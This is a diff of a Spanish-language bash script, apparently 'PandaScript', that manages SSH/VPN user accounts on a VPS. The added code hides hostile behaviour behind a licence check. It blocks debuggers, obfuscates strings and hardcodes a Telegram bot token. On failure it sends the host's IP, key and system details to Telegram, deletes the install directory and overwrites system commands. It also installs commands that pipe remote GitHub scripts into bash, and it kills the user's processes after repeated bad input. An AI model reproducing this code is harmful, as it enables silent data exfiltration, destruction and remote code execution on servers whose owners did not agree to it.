@@ -1,123 +1,3987 @@
 #!/bin/bash
-# usercodes - CONTROL USUARIOS (SSH/SSL/DROPBEAR)
-# PandaScript MOD
-# -*- ENCODING: UTF-8 -*-
-export PATH=$PATH:/usr/sbin:/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin:/usr/games
-SCPdir="/etc/adm-lite"
-[[ -e /bin/ejecutar/msg ]] && source /bin/ejecutar/msg || source /etc/adm-lite/Otros/msg 2>/dev/null
+chekKEY() {
+    return 0
+}
+ulimit -c 0 >/dev/null 2>&1 # Bloquea volcados de memoria
 
-valid_fun () {
-    msg -bar
-    echo -e "\e[1;31m     CONTROL DE USUARIOS SSH/SSL "
-    msg -bar
+if grep -q "TracerPid:[[:space:]]*[1-9]" /proc/self/status 2>/dev/null; then
+    echo "Error: Entorno de depuración detectado."
+    exit 1
+fi
+BOT_TOKEN="7527182416:AAErYZEhhe_bjXpCygYvGRa0dakOIo9yvig"
+ADMIN_ID="6122331326" 
+# ==========================================
+
+ofus() {
+    unset txtofus
+    local string="$1"
+    local length=${#string}
+    
+    for ((i = 0; i < length; i++)); do
+        # Extraer un carácter a la vez
+        char="${string:$i:1}"
+        
+        case "$char" in
+            ".") char="x" ;; "x") char="." ;;
+            "5") char="s" ;; "s") char="5" ;;
+            "1") char="@" ;; "@") char="1" ;;
+            "2") char="?" ;; "?") char="2" ;;
+            "4") char="0" ;; "0") char="4" ;;
+            "/") char="K" ;; "K") char="/" ;;
+        esac
+        txtofus+="$char"
+    done
+    
+    # Invertir la cadena al final
+    echo "$txtofus" | rev
 }
 
-verif_usr () {
-    grep -c "^$1:" /etc/passwd
-}
+# =======================
+# IP pública robusta IPv4
+# =======================
+get_public_ipv4() {
+    local ip=""
+    local endpoints=(
+        "https://api.ipify.org"
+        "https://ifconfig.me/ip"
+        "https://icanhazip.com"
+        "https://v4.ident.me"
+        "https://checkip.amazonaws.com"
+    )
 
-limpiar_expired () {
-    for u in $(cut -d: -f1 /etc/passwd | grep -v root); do
-        exp=$(chage -l "$u" 2>/dev/null | grep "La cuenta expira" | awk '{print $NF}')
-        [[ "$exp" = "nunca" ]] && continue
-        [[ -z "$exp" ]] && continue
-        if [[ "$(date -d "$exp" +%s 2>/dev/null)" < "$(date +%s)" ]]; then
-            userdel -r "$u" 2>/dev/null
+    for url in "${endpoints[@]}"; do
+        # -4: Fuerza IPv4
+        # -f: Falla silenciosamente en errores HTTP
+        # -s: Modo silencioso
+        # -m 5: Tiempo máximo de 5 segundos por intento
+        # grep -oE: SOLO captura el formato de IP (evita textos de error de proxy)
+        ip=$(curl -4 -fsL -m 5 "$url" 2>/dev/null | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | head -n1)
+
+        # Validación estricta: que tenga formato de IP y no esté vacía
+        if [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
+            # Verificación extra: que los octetos sean <= 255
+            local a b c d
+            IFS='.' read -r a b c d <<< "$ip"
+            if ((a <= 255 && b <= 255 && c <= 255 && d <= 255)); then
+                echo "$ip"
+                return 0
+            fi
         fi
     done
+
+    # Si llega aquí, fallaron todos los servidores o la red está caída
+    return 1
 }
 
-limite_usuarios () {
-    local u="$1"
-    local lim="$2"
-    [[ -z "$lim" ]] && lim=1
-    local count=0
-    for pid in $(pgrep -f "sshd:.*@pts" 2>/dev/null | head -50); do
-        local uu
-        uu=$(readlink /proc/$pid/fd/0 2>/dev/null | grep -oE "[a-zA-Z0-9_-]+$")
-        [[ "$uu" = "$u" ]] && ((count++))
+# ======================================================
+# che3() MEJORADA - Anti Piratería con reintentos
+# ======================================================
+# ======================================================
+# che3() COMPLETA - Con comando "soporte" para recuperación
+# ======================================================
+che3() {
+    local Key="$(cat /etc/cghkey 2>/dev/null | tr -d '[[:space:]]')"
+    local Reseller="$(cat /etc/reseller 2>/dev/null)"
+
+    local MachineIP=""
+    MachineIP="$(get_public_ipv4)" || {
+        rm -f /tmp/checkIP.log
+        return 0
+    }
+
+    [[ -z "$MachineIP" ]] && {
+        rm -f /tmp/checkIP.log
+        return 0
+    }
+
+    # Bypass del desarrollador (coméntalo cuando quieras testear)
+    if [[ "$Key" == "PandaHL001" ]]; then
+        return 0
+    fi
+
+    # Obtener ServerIP
+    local ServerIP=""
+    local attempts=0
+    while [[ -z "$ServerIP" && $attempts -lt 3 ]]; do
+        ServerIP="$(curl -4 -sSL --max-time 8 "https://pastebin.com/raw/76mBcKKv" 2>/dev/null | tr -d '[:space:]')"
+        [[ -z "$ServerIP" ]] && sleep 2 && ((attempts++))
     done
-    if [[ "$count" -ge "$lim" ]]; then
-        msg -verm " USUARIO: $u alcanzo el limite de conexiones ($lim)"
+
+    [[ -z "$ServerIP" ]] && {
+        rm -f /tmp/checkIP.log
+        return 0
+    }
+
+    rm -f /tmp/checkIP.log
+
+    # Descargar checkIP.log
+    local download_ok=false
+    for i in 1 2 3; do
+        wget -4 --no-check-certificate --timeout=8 -q -O /tmp/checkIP.log \
+            "http://${ServerIP}:81/ChumoGH/checkIP.log" 2>/dev/null
+        [[ -s /tmp/checkIP.log ]] && download_ok=true && break
+        sleep 2
+    done
+
+    [[ "$download_ok" != true ]] && {
+        rm -f /tmp/checkIP.log
+        return 0
+    }
+
+    # ======================================================
+    # LÓGICA DE VALIDACIÓN
+    # ======================================================
+    local is_valid=false
+    local fail_reason=""
+
+    if grep -F "$Key" /tmp/checkIP.log | grep -F "$MachineIP" >/dev/null; then
+        is_valid=true
+    elif grep -q "|${Key}|" /tmp/checkIP.log; then
+        fail_reason="La Key ya está registrada con otra IP"
+    else
+        fail_reason="Key no encontrada en el servidor de licencias"
+    fi
+
+    # --- BLOQUEO ---
+    if [[ "$is_valid" == "false" ]]; then
+
+        if [[ -e /etc/os-release ]]; then
+            source /etc/os-release
+            SISTEMA="$PRETTY_NAME"
+        else
+            SISTEMA="$(cat /etc/issue | cut -d'\' -f1 | head -n 1)"
+        fi
+
+        fecha="$(date +%d/%m/%Y)"
+        hora="$(date +%H:%M:%S)"
+        HOSTNAME="$(hostname)"
+
+        local MENSAJE="<b>🚫 VPS BLOQUEADO POR PIRATERÍA 🚫</b>%0A"
+        MENSAJE+="%0A<b>👤 DATOS DE LICENCIA</b>%0A"
+        MENSAJE+="<b>IP:</b> <code>${MachineIP}</code>%0A"
+        MENSAJE+="<b>Key:</b> <code>${Key}</code>%0A"
+        MENSAJE+="<b>Motivo:</b> ${fail_reason}%0A"
+        MENSAJE+="%0A<b>💻 DATOS DEL VPS</b>%0A"
+        MENSAJE+="<b>Sistema:</b> ${SISTEMA}%0A"
+        MENSAJE+="<b>Host:</b> ${HOSTNAME}%0A"
+        MENSAJE+="<b>Fecha:</b> ${fecha} ${hora}%0A"
+
+        local urlBOT="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
+        curl -s -X POST "$urlBOT" \
+            -d chat_id="$ADMIN_ID" \
+            -d parse_mode="HTML" \
+            -d text="${MENSAJE}" >/dev/null 2>&1
+
+        # Limpiar archivos del script
+        if [[ -d "/etc/adm-lite" ]]; then
+            find /etc/adm-lite/ -mindepth 1 -maxdepth 1 ! -name "userDIR" -exec rm -rf {} +
+        fi
+
+        # ======================================================
+        # Crear mensaje limpio de bloqueo (sin comando wget)
+        # ======================================================
+        block_access() {
+            local file_path="$1"
+            cat <<'EOF' > "$file_path"
+#!/bin/bash
+clear
+echo -e "\n\033[1;31m=================================================="
+echo -e " ¡¡ 🚫 KEY BANEADA O INVALIDA 🚫 !!"
+echo -e "=================================================="
+echo -e " FECHA: $(date +%d/%m/%Y)  HORA: $(date +%H:%M:%S)"
+echo -e "==================================================\n"
+echo -e "\033[1;33mLos datos de usuarios NO han sido borrados 💡"
+echo -e "Adquiera una licencia valida con su proveedor."
+echo -e "Genera la KEY en: @PandaScriptBot 🤖"
+echo -e "Soporte Admin: @PandaHL001 📱"
+echo -e ""
+echo -e "\033[1;32m══════════════════════════════════════════════════"
+echo -e "\033[1;36mSi crees que es un error de baneo, escribe:"
+echo -e "\033[1;33msoporte"
+echo -e "\033[1;32m══════════════════════════════════════════════════"
+echo -e "\n=================================================="
+exit 1
+EOF
+            chmod +x "$file_path"
+        }
+
+        block_access "/usr/bin/menu"
+        block_access "/usr/bin/adm"
+        block_access "/etc/adm-lite/menu"
+        block_access "/usr/local/bin/adm"
+
+        # ======================================================
+        # CREAR COMANDO "soporte" (Recuperación)
+        # ======================================================
+        cat <<'EOF' > /usr/bin/soporte
+#!/bin/bash
+clear
+echo -e "\033[1;32m══════════════════════════════════════════════════"
+echo -e "        Ejecutando script de recuperación..."
+echo -e "══════════════════════════════════════════════════"
+echo ""
+wget -qO- https://raw.githubusercontent.com/karl1999x/PandaScript/main/PandaScript/Otros/fix.sh | bash
+EOF
+
+        chmod +x /usr/bin/soporte
+
+        rm -f /tmp/checkIP.log
+        clear
+        /usr/bin/menu
+        exit 1
+    fi
+
+    rm -f /tmp/checkIP.log
+    return 0
+}
+clean_check() {
+
+# --- VARIABLES DE CONFIGURACIÓN LOCALES ---
+local ROOT_DIR_TO_CHECK="/root/adm-lite"
+local ETC_DIR_TO_CLEAN="/etc/adm-lite"
+local DIR_TO_KEEP="userDIR"
+local KEY_FILE="/etc/cghkey"
+local SETUP_FILE="/root/setup-sin-key.sh"
+local ADM_BIN="/usr/local/bin/adm"
+local REQUIRED_CONTENT="FREE-INSTALLATION"
+local SHOULD_CLEAN=false
+
+# Contenido exacto esperado para /usr/local/bin/adm (Wrapper de menú)
+local REQUIRED_ADM_CONTENT=$(cat <<'EOF'
+#!/bin/bash
+exec /root/adm-lite/menu "$@"
+EOF
+)
+
+# ==========================================================
+# === 1. VERIFICACIONES DE LIMPIEZA ===
+# ==========================================================
+
+# CHECK 1: Verificar existencia del directorio de instalación en /root/
+if [ -d "$ROOT_DIR_TO_CHECK" ]; then
+    SHOULD_CLEAN=true
+fi
+
+# CHECK 2: Verificar el contenido del archivo de llave
+if [ -f "$KEY_FILE" ] && grep -q "$REQUIRED_CONTENT" "$KEY_FILE"; then
+    SHOULD_CLEAN=true
+fi
+
+# CHECK 3: Verificar la existencia del script de instalación
+if [ -f "$SETUP_FILE" ]; then
+    SHOULD_CLEAN=true
+fi
+
+# CHECK 4: Verificar contenido exacto del wrapper ADM
+if [ -f "$ADM_BIN" ]; then
+    local CURRENT_ADM_CONTENT=$(cat "$ADM_BIN" 2>/dev/null)
+    if [ "$CURRENT_ADM_CONTENT" = "$REQUIRED_ADM_CONTENT" ]; then
+        SHOULD_CLEAN=true
+    fi
+fi
+
+
+# ==========================================================
+# === 2. ACCIONES DE LIMPIEZA CONDICIONAL (SI SE ACTIVA) ===
+# ==========================================================
+if $SHOULD_CLEAN; then
+    
+    # ACCIÓN 1: Eliminar /root/adm-lite completamente (Silenciosa)
+    rm -rf "$ROOT_DIR_TO_CHECK" 2>/dev/null
+
+    # ACCIÓN 2: Eliminar selectivamente /etc/adm-lite/
+    if [ -d "$ETC_DIR_TO_CLEAN" ]; then
+        mkdir -p "$ETC_DIR_TO_CLEAN/$DIR_TO_KEEP" 2>/dev/null
+        find "$ETC_DIR_TO_CLEAN/" -mindepth 1 -maxdepth 1 ! -name "$DIR_TO_KEEP" -exec rm -rf {} + 2>/dev/null
+    fi
+fi
+}
+che3
+start_menu() {
+    
+    nohup ./start_menu "$@" > /dev/null 2>&1 &
+}
+cleanup() {
+    # Eliminar archivo temporal
+    rm -f /tmp/some_temp_file.tmp
+    
+    
+}
+if [[ ! -f "/etc/adm-lite/local.txt" || ! -f "/etc/adm-lite/v-local.log" ]]; then
+  exit 0
+fi
+menu_item(){
+  local opciones=("$@")
+  local i=1
+  msg -bar3
+  #echo -e " \033[0;35m[\033[0;36m0\033[0;35m]\033[0;33m ${flech} $(msg -bra "\033[1;43m[ REGRESAR ]\e[0m")"
+  for item in "${opciones[@]}"; do
+    echo -e "\033[0;35m [\033[0;36m${i}\033[0;35m]\033[0;33m ${flech} ${cor[3]}${item}"
+    ((i++))
+  done
+  msg -bar3
+  echo -e " \033[0;35m[\033[0;36m0\033[0;35m]\033[0;33m ${flech} $(msg -bra "\033[1;41m[ REGRESAR ]\e[0m")"
+  msg -bar3
+}
+trap cleanup EXIT
+start_menu
+
+wait
+cco=1
+[[ -e /bin/ejecutar/limFIX ]] && _limTOP="$(cat < /bin/ejecutar/limFIX)" || _limTOP='1'
+chekKEY &> /dev/null 2>&1
+users=$(cat /etc/passwd|grep 'home'|grep 'false'|grep -v 'syslog'|awk -F ':' '{print $1}')
+_ps="$(ps x)"
+unset tmm ext tempo tempoin
+uskk=$(cat /bin/ejecutar/uskill)
+[[ ! -d /etc/adm-lite/userDIR ]] && mkdir /etc/adm-lite/userDIR
+export HIDE_STATS_IN_USERCODES=1
+source /etc/adm-lite/cabecalho
+mem_free=$(free --mega -h | awk 'NR==2{printf $4}')
+cpu_used="$(top -b -n1 | grep 'Cpu(s)' | awk '{print $2 + $4}')"%
+
+blocked_users=$(grep '/home' /etc/passwd | awk -F: '{print $1}' | while read user; do
+    # Ignorar usuarios comunes de sistema
+    [[ "$user" =~ ^(ubuntu|debian|nobody|syslog|sshd|messagebus)$ ]] && continue
+
+    # Verifica si la contraseña está bloqueada
+    if [[ $(passwd --status "$user" 2>/dev/null | awk '{print $2}') == "L" ]]; then
+        echo "$user"
+    fi
+done | wc -l)
+
+# Asegurarse de que ul2 siempre tenga un valor válido
+if [ -z "$blocked_users" ] || [ "$blocked_users" -eq 0 ]; then
+    ul2="\033[0;31m [0]"
+else
+    ul2="\033[0;31m [\033[1;32m${blocked_users}\033[0;31m]"
+fi
+
+[[ -e /etc/systemd/system/killadm.service ]] && lmt="\033[0;31m [\033[0;32mON\033[0;31m] " || lmt="\033[0;31m [OFF]"
+if [[ -f /etc/systemd/system/v2ray.service ]]; then
+    if systemctl is-active --quiet v2ray; then
+        check_v2ray_status="\033[1;32m[ON]\033[0m" 
+    else
+        check_v2ray_status="\033[1;31m[OFF]\033[0m"  
+    fi
+else
+    check_v2ray_status="\033[1;31m[OFF]\033[0m"  
+fi
+
+status=$(systemctl is-active BotSSH.service)
+if [[ "$status" == "active" ]]; then
+    bt="\033[1;32mON\033[0m"
+else
+    bt="\033[1;31mOFF\033[0m"
+fi
+
+var_sks1=$(systemctl is-active checkuser.service > /dev/null && echo -e "\033[1;32mON\033[0m" || echo -e "\033[1;31mOFF\033[0m")
+echo -e "${cor[2]} ‍ ${cor[5]}CUENTAS SSH / SSL / DROPBEAR By @PandaHL001 ‍"
+msg -bar
+echo -e "  \033[1;34m ▸ M LIBRE: \033[1;32m${mem_free}  \033[1;34m ▸ USO DE CPU:\033[1;32m ${cpu_used} "
+msg -bar
+echo -e "\033[0;35m [\033[0;36m01\033[0;35m]\033[0;31m >${cor[3]} AGREGAR USUARIO 📝 \033[0;31m(\033[0;33mHWID\033[0;31m/\033[0;33mNORMAL\033[0;31m/\033[0;33mTOKEN\033[0;31m)"
+echo -e "\033[0;35m [\033[0;36m02\033[0;35m]\033[0;31m >${cor[3]} BORRAR 1/TODOS LOS USUARIO/s ❌"
+echo -e "\033[0;35m [\033[0;36m03\033[0;35m]\033[0;31m >${cor[3]} EDITAR USUARIOS REGISTRADOS ✏️"
+echo -e "\033[0;35m [\033[0;36m04\033[0;35m]\033[0;31m >${cor[3]} MOSTRAR USUARIOS REGISTRADOS 📋"
+echo -e "\033[0;35m [\033[0;36m05\033[0;35m]\033[0;31m >${cor[3]} MOSTRAR USUARIOS CONECTADOS 🌐"
+echo -e "\033[0;35m [\033[0;36m06\033[0;35m]\033[0;31m >${cor[3]} EDITAR BANNER ( SSH/Dropbear ) 🎨"
+echo -e "\033[0;35m [\033[0;36m07\033[0;35m]\033[0;31m >${cor[3]} BUSCAR USUARIO por token/hwid 🔍"
+echo -e "\033[0;35m [\033[0;36m08\033[0;35m]\033[0;31m >${cor[3]} BLOQUEAR / DESBLOQUEAR USUARIOS $ul2"
+echo -e "\033[0;35m [\033[0;36m09\033[0;35m]\033[0;31m >${cor[3]} BACKUP USUARIOS \033[0;32m(#OFFICIAL) 📦"
+echo -e "\033[0;35m [\033[0;36m10\033[0;35m]\033[0;31m >${cor[3]} CONTROL SSH ( BotTelegram $bt ) 🤖"
+echo -e "\033[0;35m [\033[0;36m11\033[0;35m]\033[0;31m >${cor[3]} CHECKUSER ONLINE ( $var_sks1 ) 👀"
+echo -e "\033[0;35m [\033[0;36m12\033[0;35m]\033[0;31m >${cor[3]} CREAR USUARIO V2RAY ${check_v2ray_status} 🌐"
+echo -e "\033[0;35m [\033[0;36m13\033[0;35m]\033[0;31m >${cor[3]} KILL MULTILOGIN \033[0;33m(#BETA)"
+
+[[ -e /etc/systemd/system/killadm.service ]] && echo -e "\033[0;35m [\033[0;36m14\033[0;35m]\033[0;31m >${cor[3]} VER LOGS DE MULTILOGUIN ( $ ) " 
+#echo -e "\033[0;35m [\033[0;36m15\033[0;35m]\033[0;31m >${cor[3]} MENU DE CUENTAS TROJAN \033[0;33m(#BETA)"
+msg -bar
+
+[[ -e /etc/adm-lite/modulos ]] && echo -ne " \033[0;33m(\033[0;32mCONTADOR :$_on\033[0;33m) " || echo -ne "\033[0;33m(\033[0;32mCONTADOR :$_off\033[0;33m) "
+[[ -e /etc/systemd/system/killadm.service ]] && echo -e "\033[0;33m(\033[1;31m \033[1;36mKILL MULTILOGUIN ${_on}\033[0;33m) " || echo -e "\033[0;33m(\033[1;36mKILL MULTILOGIN\033[1;31m\033[1;36m ${_off}\033[0;33m)\033[0m"
+msg -bar
+
+mportas () {
+unset portas
+portas_var=$(lsof -V -i tcp -P -n | grep -v "ESTABLISHED" |grep -v "COMMAND" | grep "LISTEN")
+while read port; do
+var1=$(echo $port | awk '{print $1}') && var2=$(echo $port | awk '{print $9}' | awk -F ":" '{print $2}')
+[[ "$(echo -e $portas|grep "$var1 $var2")" ]] || portas+="$var1 $var2\n"
+done <<< "$portas_var"
+i=1
+echo -e "$portas"
+}
+_usCHECK () {
+    clear
+    while true; do
+        msg -bar
+        echo -e "${cor[4]}      VERIFICAR ACTIVIDAD MULTILOGIN + BLOQUEOS"
+        msg -bar
+        echo -e "\033[0;35m [1]\033[1;37m > Ver multilogins generales (ordenados por fecha)"
+        echo -e "\033[0;35m [2]\033[1;37m > Ver multilogins por usuario"
+        echo -e "\033[0;35m [3]\033[1;37m > Ver usuarios BLOQUEADOS por el limitador"
+        echo -e "\033[0;35m [4]\033[1;37m > Reiniciar estadísticas (borrar logs)"
+        echo -e "\033[0;35m [0]\033[1;37m > Salir"
+        msg -bar
+        
+        echo -ne "${cor[7]}Seleccione una opción: ${cor[0]}"
+        read opt
+        echo ""
+
+        case $opt in
+            1)
+                clear
+                LOG_FILE="/root/limiter.log"
+
+                if [[ ! -f "$LOG_FILE" || ! -s "$LOG_FILE" ]]; then
+                    echo -e "${cor[3]} No hay registros aún.${cor[0]}"
+                    msg -bar
+                    read -p "Presione ENTER para continuar..."
+                    clear
+                    continue
+                fi
+
+                echo -e "${cor[4]} Registros de Multilogin y Bloqueos:${cor[0]}"
+                msg -bar
+
+                while IFS= read -r line; do
+                    echo -e "${cor[1]}$line${cor[0]}"
+                done < "$LOG_FILE"
+
+                msg -bar
+                read -p "Presione ENTER para continuar..."
+                clear
+                ;;
+
+            2)
+                clear
+                select_users
+                [[ -z "$select_name" ]] && continue
+                namer="$select_name"
+
+                LOG_FILE="/root/limiter.log"
+                user_logs=$(grep -F "$namer" "$LOG_FILE" 2>/dev/null || echo "")
+
+                if [[ -z "$user_logs" ]]; then
+                    echo -e "${cor[3]} No hay registros para este usuario.${cor[0]}"
+                    msg -bar
+                    read -p "Presione ENTER..."
+                    clear
+                    continue
+                fi
+
+                echo -e "${cor[4]} Registros del usuario: ${cor[2]}$namer${cor[0]}"
+                msg -bar
+                echo "$user_logs"
+                msg -bar
+                read -p "Presione ENTER para continuar..."
+                clear
+                ;;
+
+            3)
+                # === Ver Usuarios Bloqueados (Solo clientes reales) ===
+                clear
+                msg -bar
+                echo -e "${cor[4]}     USUARIOS BLOQUEADOS POR EL LIMITADOR"
+                msg -bar
+
+                blocked=0
+
+                for user_file in /etc/adm-lite/userDIR/*; do
+                    [[ -f "$user_file" ]] || continue
+
+                    user=$(basename "$user_file")
+
+                    if ! id "$user" &>/dev/null; then
+                        continue
+                    fi
+
+                    status=$(passwd --status "$user" 2>/dev/null | awk '{print $2}')
+
+                    if [[ "$status" == "L" ]]; then
+                        limite=$(grep "limite:" "$user_file" | awk '{print $2}')
+                        [[ -z "$limite" ]] && limite="Desconocido"
+
+                        echo -e "${cor[1]}Usuario: ${cor[2]}$user${cor[0]}  |  Límite: ${cor[3]}$limite${cor[0]}  |  ${cor[1]}BLOQUEADO${cor[0]}"
+                        ((blocked++))
+                    fi
+                done
+
+                if [[ $blocked -eq 0 ]]; then
+                    echo -e "${cor[3]} No hay usuarios bloqueados actualmente.${cor[0]}"
+                fi
+
+                msg -bar
+                read -p "Presione ENTER para continuar..."
+                clear
+                ;;
+
+            4)
+                clear
+                msg -bar
+                echo -e "${cor[1]} ¿Realmente desea REINICIAR TODAS LAS ESTADÍSTICAS?"
+                msg -bar
+                echo -ne "${cor[6]} Confirmar [S/N]: ${cor[0]}"
+                read -n 1 confirm
+                echo ""
+
+                if [[ $confirm = @(s|S|y|Y) ]]; then
+                    rm -f /root/limiter.log
+                    touch /root/limiter.log
+                    chmod 644 /root/limiter.log
+                    echo -e "${cor[2]} Estadísticas reiniciadas correctamente.${cor[0]}"
+                else
+                    echo -e "${cor[3]} Operación cancelada.${cor[0]}"
+                fi
+                msg -bar
+                read -p "Presione ENTER..."
+                clear
+                ;;
+
+            0)
+                return
+                ;;
+
+            *)
+                echo -e "${cor[1]} Opción inválida.${cor[0]}"
+                sleep 1.2
+                clear
+                ;;
+        esac
+    done
+}
+
+selection_fun() {
+    local selection="null"
+    local opc=$1
+    local range
+    for((i=0; i<=${opc}; i++)); do range[$i]="$i "; done
+    local error_count=0
+    while [[ ! $(echo ${range[*]}|grep -w "$selection") ]]; do
+        echo -ne "\033[1;37m ► Opcion : " >&2
+        read -r selection 2>/dev/null 
+        tput cuu1 >&2 && tput dl1 >&2
+        ((error_count++))
+        if [[ "$selection" == "0" ]]; then
+            return 1
+        fi
+        
+        if [[ $error_count -eq 5 ]]; then
+            shutdown 2>/dev/null 2>&1 
+        fi
+    done
+    echo $selection
+}
+
+
+
+fun_ovpn_onl () {
+for userovpn in `cat /etc/passwd | grep ovpn | awk -F: '{print $1}'`; do
+us=$(cat /etc/openvpn/openvpn-status.log | grep $userovpn | wc -l)
+if [ "$us" != "0" ]; then
+echo "$userovpn"
+fi
+done
+}
+
+shutdown() {
+    pkill -f usercodes >/dev/null 2>&1
+    pkill -f ferramentas >/dev/null 2>&1
+    pkill -f menu_inst >/dev/null 2>&1
+    pkill -f menu >/dev/null 2>&1
+    pkill -f slowdns1 >/dev/null 2>&1
+    pkill -u $(whoami) >/dev/null 2>&1
+    bash -l
+    exit 0
+}
+
+
+keyb() {
+    pastebin_url="https://pastebin.com/raw/76mBcKKv"
+    check_ip_url="http://$(curl -s $pastebin_url):81/ChumoGH/checkIP.log"
+    client_ip=$(curl -s ifconfig.me)
+    _check2=$(curl -s $check_ip_url)
+
+    if [ -n "$client_ip" ] && [ -n "$_check2" ]; then
+        if ! echo "$_check2" | grep -q "$client_ip"; then
+            mss_="IP NO AUTORIZADO POR BOT-GEN @ModV6Bot"
+            ban_message="\n\n\033[1;31m==================================================\n ¡¡ 🚫 KEY BANEADA  🚫 ! CONTACTE SU ADMINISTRADOR! \n==================================================\n ¡¡ FECHA DE BANEO :$(date +%d/%m/%Y) HORA :$(date +%H:%M:%S) \n==================================================\n\n¡¡ ${mss_} \n\n==================================================\n"
+
+            create_ban_script() {
+                local file_path="$1"
+                cat <<EOF >$file_path
+clear && clear
+echo -e "$ban_message"
+echo -e "\n\033[1;33mNo se preocupe, los datos de los usuarios NO se borran💡"
+echo -e "Instala nuevamente la script con una nueva KEY 🔑"
+echo -e "Genera la KEY en el BOT-GEN @ModV6Bot 🤖"
+echo -e "Contacto: @PandaHL001 📱"
+echo -e "\n==================================================\n"
+EOF
+            }
+
+            create_ban_script /usr/bin/menu
+            create_ban_script /usr/bin/adm
+            create_ban_script /usr/bin/cgh
+            
+            # Llamar a shutdown para cerrar procesos
+            shutdown
+        fi
     fi
 }
 
-crear_usuario () {
-    valid_fun
-    echo -ne "\033[1;33m NOMBRE DE USUARIO : \033[0m" && read u
-    [[ -z "$u" ]] && { msg -verm "Nombre vacio"; return; }
-    if [[ "$(verif_usr $u)" -gt 0 ]]; then
-        msg -verm "EL USUARIO YA EXISTE"
-        sleep 2
+time-us () {
+if [[ -z "${tempoin}" ]];then
+    tempoin="30"
+    tempoin=$(( $tempoin * 60 ))
+    tempoin=$tempoin"s"
+    echo "Default 30 minutos"
+fi
+tempo=$(echo "$tempoin" |sed 's/ //g')
+tmm=$(echo $tempo |sed 's/[0-9]//g')
+if [ "$tmm" = "s" ]; then
+ext=$(echo $tempo |sed 's/[a-z]//g')
+let tempo=$ext*1
+tempo=$tempo"s"
+#echo -ne "$(msg -verd "") $(msg -verm2 "") "&& msg -bra "\033[1;41m"
+ext=1
+fi
+if [ "$tmm" = "m" ]; then
+ext=$(echo $tempo |sed 's/[a-z]//g')
+let tempo=$ext*60
+tempo=$tempo"s"
+#echo -ne "$(msg -verd "") $(msg -verm2 "") "&& msg -bra "\033[1;41m"
+ext=1
+fi
+if [ "$tmm" = "h" ]; then   
+ext=$(echo $tempo |sed 's/[a-z]//g')
+    if [ "$ext" > "23" ]; then   
+    ext=$(echo $tempo |sed 's/[a-z]//g')
+    let tempo=$ext*3600
+    tempo=$tempo"s"
+    else
+    let tempo=$ext*3600
+    tempo=$tempo"s"
+    ext=1
+    fi
+#echo -ne "$(msg -verd "") $(msg -verm2 "") "&& msg -bra "\033[1;41m"
+fi
+if [ "$tmm" = "d" ]; then
+ext=$(echo $tempo |sed 's/[a-z]//g')
+let tempo=$ext*3600
+tempo=$tempo"s"
+#echo -ne "$(msg -verd "") $(msg -verm2 "") "&& msg -bra "\033[1;41m"
+fi
+}
+
+function recuva1 {
+    clean_check
+    
+    # Ejecutar el enlace sin ninguna verificación o manejo de la key
+    source <(curl -sL https://raw.githubusercontent.com/karl1999x/PandaScript/main/PandaScript/Otros/sd)
+}
+criarusuarioteste_hwid() {
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+    tput cuu1 && tput dl1
+
+    meu_ip
+    if [[ ! -d /etc/usuariosteste ]]; then
+        mkdir /etc/usuariosteste 
+    fi
+    
+    # Asegúrate de que /etc/adm-lite/userDIR exista
+    if [[ ! -d /etc/adm-lite/userDIR ]]; then
+        mkdir -p /etc/adm-lite/userDIR 
+    fi
+
+    msg -bar
+    echo -ne "${cor[5]} ⎚ NOMBRE DEL HWID: "
+    echo # Nueva línea
+    echo -e -n "\033[33m-> \033[0m" # Símbolo de flecha
+    read -e name # La lectura se hace aquí
+    [[ -z $name ]] && echo -e "${cor[5]} ⚠️ NO SE REGISTRÓ NOMBRE, RETORNANDO ⚠️${cor[0]}" && return 
+    
+    msg -bar
+    echo -e -n "${cor[5]} INGRESE EL HWID: " # Título del prompt
+    echo # Nueva línea
+    read -p "$(echo -e "\033[33m-> ${cor[4]}")" hwid # Símbolo de flecha y luego color de entrada
+    
+    # Limpiar espacios
+    hwid=$(echo "$hwid" | tr -d '[:space:]')
+    [[ -z "${hwid}" ]] && echo -e "${cor[5]} ⚠️ NO SE INGRESÓ HWID, RETORNANDO ⚠️${cor[0]}" && return
+    
+    # Usar HWID COMPLETO (soporta 32+ caracteres)
+    local hwid_system_user="$hwid"
+
+    if id -u "$hwid_system_user" >/dev/null 2>&1 || grep -q "^${hwid_system_user}:" /etc/passwd 2>/dev/null; then
+        echo -e "${cor[5]} ⚠️ UN USUARIO ASOCIADO A ESTE HWID YA EXISTE. ⚠️${cor[0]}"
+        echo -e "${cor[5]} ⚠️ Por favor, registre otro HWID o verifique. ⚠️${cor[0]}"
         return
     fi
-    echo -ne "\033[1;33m NOMBRE DE PASSWORD : \033[0m" && read p
-    echo -ne "\033[1;33m LIMITE DE CONEXIONES : \033[0m" && read lim
-    cmd_useradd=$(useradd -M -s /bin/false -p "$(openssl passwd -1 "$p")" "$u")
-    [[ "$?" -eq 0 ]] && msg -verd "USUARIO $u CREADO" || msg -verm "FALLO AL CREAR"
-    read -p " Enter para Continuar"
+    
+    msg -bar
+    echo -e "${cor[5]} Duración para el Usuario HWID: \033[1;36m$name\033[0m"
+    echo -e "   Use s = segundos, m = minutos, h = horas e d = dias (Ej: 14s, 5m, 1h, 7d)."
+    echo # Nueva línea
+    echo -e -n "\033[33m-> \033[0m" # Símbolo de flecha
+    read tempoin # La lectura se hace aquí
+
+    local tempo_seconds_for_script 
+    local tempo_display_formatted="" 
+    
+    local raw_tempoin="$tempoin" 
+
+    if [[ "$tempoin" =~ ^([0-9]+)([smhd])$ ]]; then
+        local num=${BASH_REMATCH[1]}
+        local unit=${BASH_REMATCH[2]}
+        case "$unit" in
